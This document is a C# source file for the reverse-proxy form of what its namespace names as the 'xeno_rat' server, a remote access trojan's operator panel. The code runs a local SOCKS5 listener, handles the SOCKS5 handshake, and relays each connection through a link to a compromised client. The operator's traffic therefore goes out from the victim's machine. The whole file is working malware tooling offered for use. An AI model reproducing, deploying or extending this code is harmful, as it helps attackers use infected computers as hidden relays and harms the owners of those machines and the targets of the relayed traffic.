using dnlib.DotNet.Emit;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Drawing;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using static System.Windows.Forms.VisualStyles.VisualStyleElement;

namespace xeno_rat_server.Forms
{
    public partial class Reverse_Proxy : Form
    {
        Node client;
        public Reverse_Proxy(Node _client)
        {
            InitializeComponent();
            client = _client;
            client.AddTempOnDisconnect(TempOnDisconnect);
        }
        private const int TIMEOUT_SOCKET = 10;
        private const string LOCAL_ADDR = "127.0.0.1";
        private List<Node> killnodes = new List<Node>();
        private Socket new_socket = null;
        public void TempOnDisconnect(Node node)
        {
            if (node == client)
            {
                if (new_socket != null)
                {
                    new_socket.Close(0);
                    new_socket = null;
                }
                if (!this.IsDisposed)
                {
                    this.BeginInvoke((MethodInvoker)(() =>
                    {
                        this.Close();
                    }));
                }
            }
        }
        private static Socket CreateSocket()
        {
            try
            {
                Socket sock = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
                sock.SetSocketOption(SocketOptionLevel.Socket, SocketOptionName.ReceiveTimeout, TIMEOUT_SOCKET);
                return sock;
            }
            catch (SocketException ex)
            {
                Console.WriteLine("Failed to create socket: {0}", ex.Message);
                return null;
            }
        }

        private static bool BindPort(Socket sock, int LOCAL_PORT)
        {
            try
            {
                Console.WriteLine("Bind {0}", LOCAL_PORT);
                sock.SetSocketOption(SocketOptionLevel.Socket, SocketOptionName.ReuseAddress, true);
                sock.Bind(new IPEndPoint(IPAddress.Parse(LOCAL_ADDR), LOCAL_PORT));
            }
            catch (SocketException ex)
            {
                Console.WriteLine("Bind failed: {0}", ex.Message);
                sock.Close(0);
                return false;
            }

            try
            {
                sock.Listen(1);
            }
            catch
            {
                sock.Close(0);
                return false;
            }

            return true;
        }


        private async Task<Node> CreateSubSubNode(Node client)
        {
            Node SubSubNode = await client.Parent.CreateSubNodeAsync(2);
            if (SubSubNode == null) 
            {
                return null;
            }
            int id = await Utils.SetType2setIdAsync(SubSubNode);
            if (id != -1)
            {
                await Utils.Type2returnAsync(SubSubNode);
                byte[] a = SubSubNode.sock.IntToBytes(id);
                await client.SendAsync(a);
                byte[] found = await client.ReceiveAsync();
                if (found == null || found[0] == 0)
                {
                    SubSubNode.Disconnect();
                    return null;
                }
            }
            else
            {
                SubSubNode.Disconnect();
                return null;
            }
            return SubSubNode;
        }


        private async Task<byte[]> RecvAll(Socket sock, int size)
        {
            byte[] data = new byte[size];
            int total = 0;
            int dataLeft = size;
            while (total < size)
            {
                if (!sock.Connected)
                {
                    return null;
                }

                int recv = await sock.ReceiveAsync(new ArraySegment<byte>(data, total, dataLeft), SocketFlags.None);

                if (recv == 0)
                {
                    data = null;
                    break;
                }

                total += recv;
                dataLeft -= recv;
            }

            return data;
        }

        private async Task<bool> replyMethodSelection(Socket sock, byte method_code) 
        {
            byte[] reply = new byte[] { 5, method_code };
            if (!sock.Connected) 
            {
                return false;
            }
            return (await sock.SendAsync(new ArraySegment<byte>(reply), SocketFlags.None))!=0;
        }

        private async Task<bool> replyRequestError(Socket sock, byte rep_err_code)
        {
            byte[] reply = new byte[] { 5, rep_err_code, 0x00, Socks5Const.AddressType.IPv4, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 };
            if (!sock.Connected)
            {
                return false;
            }
            return (await sock.SendAsync(new ArraySegment<byte>(reply), SocketFlags.None)) != 0;
        }

        private async Task<bool> StartNegotiations(Socket client_sock)
        {
            byte[] version_header = await RecvAll(client_sock, 1);
            if (version_header == null || version_header[0] != 5) // checking if socks(5)
            {
                await replyMethodSelection(client_sock, Socks5Const.AuthMethod.NoAcceptableMethods);
                return false;
            }
            byte[] number_of_methods = await RecvAll(client_sock, 1); // requested methods to use, ranging for 0-256
            if (number_of_methods == null) 
            {
                return false;
            }
            List<int> requested_methods = new List<int>();
            for (int i = 0; i < number_of_methods[0]; i++)
            {
                byte[] method = await RecvAll(client_sock, 1);
                requested_methods.Add(method[0]);
            }
            if (!requested_methods.Contains(Socks5Const.AuthMethod.NoAuthenticationRequired)) 
            {
                await replyMethodSelection(client_sock, Socks5Const.AuthMethod.NoAcceptableMethods);
                return false;
            }
            await replyMethodSelection(client_sock, Socks5Const.AuthMethod.NoAuthenticationRequired);
            return true;
        }

        private async Task DisconnectSockAsync(Socket sock)
        {
            try
            {
                if (sock != null)
                {
                    await Task.Delay(10);
                    await Task.Factory.FromAsync(sock.BeginDisconnect, sock.EndDisconnect, true, null);
                }
            }
            catch
            {
                sock?.Close(0);
            }
        }

        private async Task HandleConnectAndProxy(Socket client_sock)
        {
            // on all returns decomission the sockets
            byte[] version_header = await RecvAll(client_sock, 1);
            if (version_header == null || version_header[0] != 5) // checking if socks(5)
            {
                await replyMethodSelection(client_sock, Socks5Const.AuthMethod.NoAcceptableMethods);
                await DisconnectSockAsync(client_sock);
                return;
            }


            byte[] command = await RecvAll(client_sock, 1); // requested methods to use, ranging for 0-256
            byte[] rzv = await RecvAll(client_sock, 1);
            byte[] Address_type_bytes = await RecvAll(client_sock, 1);

            if (Address_type_bytes == null || command == null || command[0] != Socks5Const.Command.Connect)
            {
                await replyRequestError(client_sock, Socks5Const.Reply.CommandNotSupported);
                await DisconnectSockAsync(client_sock);
                return;
            }
            int Address_type = Address_type_bytes[0];

            string dest_addr = "";
            if (Address_type == Socks5Const.AddressType.IPv4)
            {
                byte[] dest_addr_bytes = await RecvAll(client_sock, 4);
                if (dest_addr_bytes == null)
                {
                    await replyRequestError(client_sock, Socks5Const.Reply.Failure);
                    await DisconnectSockAsync(client_sock);
                    return;
                }
                dest_addr = new IPAddress(dest_addr_bytes).ToString();
            }
            else if (Address_type == Socks5Const.AddressType.DomainName)
            {
                byte[] domain_name_len = await RecvAll(client_sock, 1);
                if (domain_name_len == null)
                {
                    await replyRequestError(client_sock, Socks5Const.Reply.Failure);
                    await DisconnectSockAsync(client_sock);
                    return;
                }
                byte[] domain_name_bytes = await RecvAll(client_sock, domain_name_len[0]);
                dest_addr = Encoding.UTF8.GetString(domain_name_bytes);
            }
            else
            {
                await replyRequestError(client_sock, Socks5Const.Reply.AddressTypeNotSupported);
                await DisconnectSockAsync(client_sock);
                return;
            }
            byte[] dest_port_bytes = await RecvAll(client_sock, 2);
            if (dest_port_bytes == null)
            {
                await replyRequestError(client_sock, Socks5Const.Reply.Failure);
                await DisconnectSockAsync(client_sock);
                return;
            }

            if (BitConverter.IsLittleEndian)
            {
                Array.Reverse(dest_port_bytes);
            }

            int dest_port = BitConverter.ToInt16(dest_port_bytes, 0);
            int ConnectTimeout = 10000;//mili-seconds

            Node subnode = await CreateSubSubNode(client);
            if (subnode == null)
            {
                await replyRequestError(client_sock, Socks5Const.Reply.Failure);
                await DisconnectSockAsync(client_sock);
                return;
            }
            killnodes.Add(subnode);
            await subnode.SendAsync(Encoding.UTF8.GetBytes(dest_addr));
            await subnode.SendAsync(subnode.sock.IntToBytes(dest_port));
            await subnode.SendAsync(subnode.sock.IntToBytes(ConnectTimeout));
            byte[] recv_msg_bytes = await subnode.ReceiveAsync();
            if (recv_msg_bytes == null) 
            {
                await replyRequestError(client_sock, Socks5Const.Reply.Failure);
                await DisconnectSockAsync(client_sock);
                return;
            }
            int recv_msg = recv_msg_bytes[0];

            if (recv_msg == 2)
            {
                await replyRequestError(client_sock, Socks5Const.Reply.ConnectionRefused);
                await DisconnectSockAsync(client_sock);
                return;
            }
            else if (recv_msg == 3)
            {
                await replyRequestError(client_sock, Socks5Const.Reply.HostUnreachable);
                await DisconnectSockAsync(client_sock);
                return;
            }
            else if (recv_msg == 4) 
            {
                await replyRequestError(client_sock, Socks5Const.Reply.Failure);
                await DisconnectSockAsync(client_sock);
                return;
            }
            byte[] rsock_addr = await subnode.ReceiveAsync();
            byte[] rsock_port = await subnode.ReceiveAsync();
            if (rsock_addr.Length != 4 || rsock_port.Length != 2) 
            {
                await replyRequestError(client_sock, Socks5Const.Reply.Failure);
                await DisconnectSockAsync(client_sock);
                return;
            }
            byte[] ConnectedPayload = new byte[] { 5, Socks5Const.Reply.OK, 0x00, Socks5Const.AddressType.IPv4, rsock_addr[0], rsock_addr[1], rsock_addr[2], rsock_addr[3], rsock_port[0], rsock_port[1] };

            bool SentProperly = (await client_sock.SendAsync(new ArraySegment<byte>(ConnectedPayload), SocketFlags.None)) != 0;

            if (!SentProperly) 
            {
                return;
            }
            ListViewItem lvi = new ListViewItem();
            lvi.Text = dest_addr + ":" + dest_port.ToString();
            ListViewItem item=null;
            listView1.BeginInvoke((MethodInvoker)(() => { item = listView1.Items.Add(lvi); }));
            await RecvSendLoop(client_sock, subnode, 4096);
            await DisconnectSockAsync(client_sock);
            subnode.Disconnect();
            listView1.BeginInvoke((MethodInvoker)(() => { item.Remove(); }));
        }

        private async Task RecvSendLoop(Socket client_sock, Node subnode, int bufferSize)
        {
            while (button2.Enabled && client_sock.Connected && subnode.Connected() && new_socket != null)
            {
                try
                {
                    await Task.WhenAny(
                           Task.Run(() => client_sock.Poll(1000, SelectMode.SelectRead)),
                           Task.Run(() => subnode.sock.sock.Poll(1000, SelectMode.SelectRead))
                       );
                    if (client_sock.Available > 0)
                    {
                        byte[] buffer = new byte[bufferSize];
                        int bytesRead = await client_sock.ReceiveAsync(new ArraySegment<byte>(buffer), SocketFlags.None);
                        if (bytesRead == 0)
                        {
                            return;
                        }

                        await subnode.SendAsync(buffer.Take(bytesRead).ToArray());

                    }

                    if (subnode.sock.sock.Available > 0)
                    {
                        byte[] data = await subnode.ReceiveAsync();
                        if ((await client_sock.SendAsync(new ArraySegment<byte>(data), SocketFlags.None)) == 0)
                        {
                            return;
                        }
                    }
                    await Task.Delay(100);
                }
                catch 
                {
                    return;
                }
            }

        }

        private async Task HandleProxyCreation(Socket client_sock) 
        {
            if (await StartNegotiations(client_sock))
            {
                await HandleConnectAndProxy(client_sock);
            }
            else
            {
                await DisconnectSockAsync(client_sock);
            }
        }

        private async Task AcceptLoop(Socket new_socket)
        {
            while (button2.Enabled)
            {
                try
                {
                    Socket socks_client = await new_socket.AcceptAsync();
                    HandleProxyCreation(socks_client);
                }
                catch
                {
                    continue;
                }
            }
            await DisconnectSockAsync(new_socket);
        }

        private void button1_Click(object sender, EventArgs e)
        {   
            int port;
            if (!int.TryParse(textBox1.Text, out port)) 
            {
                MessageBox.Show("Invalid port");
                return;
            }
            new_socket = CreateSocket();
            if (!BindPort(new_socket, port)) 
            {
                MessageBox.Show("Could not bind port. Another process may already be using that port.");
                return;
            }
            button1.Enabled = false;
            button2.Enabled = true;
            new Thread(async ()=>await AcceptLoop(new_socket)).Start();
        }

        private void button2_Click(object sender, EventArgs e)
        {
            foreach (Node i in killnodes)
            {
                if (i!=null)
                i.Disconnect();
            }
            killnodes.Clear();
            if (new_socket != null)
            {
                new_socket.Close(0);
                new_socket = null;
            }
            button1.Enabled = true;
            button2.Enabled = false;

        }

        private void Reverse_Proxy_FormClosing(object sender, FormClosingEventArgs e)
        {
            foreach (Node i in killnodes)
            {
                if (i != null)
                    i.Disconnect();
            }
            killnodes.Clear();
            if (new_socket != null)
            {
                new_socket.Close(0);
                new_socket = null;
            }
        }

        private void textBox2_TextChanged(object sender, EventArgs e)
        {

        }

        private void Reverse_Proxy_Load(object sender, EventArgs e)
        {
            listView1.GetType().GetProperty("DoubleBuffered", System.Reflection.BindingFlags.Instance | System.Reflection.BindingFlags.NonPublic).SetValue(listView1, true, null);
        }
    }


    public static class Socks5Const
    {
        public static class AuthMethod
        {
            public static byte NoAuthenticationRequired = 0x00;
            public static byte GSSAPI = 0x01;
            public static byte UsernamePassword = 0x02;
            public static byte NoAcceptableMethods = 0xFF;
            // '\x03' to '\x7F' IANA ASSIGNED
            // '\x80' to '\xFE' RESERVED FOR PRIVATE METHODS
        }

        public static class Command
        {
            public static byte Connect = 0x01;
            public static byte Bind = 0x02;
            public static byte UdpAssociate = 0x03;
        }

        public static class AddressType
        {
            public static byte IPv4 = 0x01;
            public static byte DomainName = 0x03;
            public static byte IPv6 = 0x04;
        }

        public static class Reply
        {
           public static byte OK = 0x00;                       // succeeded
           public static byte Failure = 0x01;                  // general SOCKS server failure
           public static byte NotAllowed = 0x02;               // connection not allowed by ruleset
           public static byte NetworkUnreachable = 0x03;       // Network unreachable
           public static byte HostUnreachable = 0x04;          // Host unreachable
           public static byte ConnectionRefused = 0x05;        // Connection refused
           public static byte TtlExpired = 0x06;               // TTL expired
           public static byte CommandNotSupported = 0x07;      // Command not supported
           public static byte AddressTypeNotSupported = 0x08;   // Address type not supported
        }
    }

}
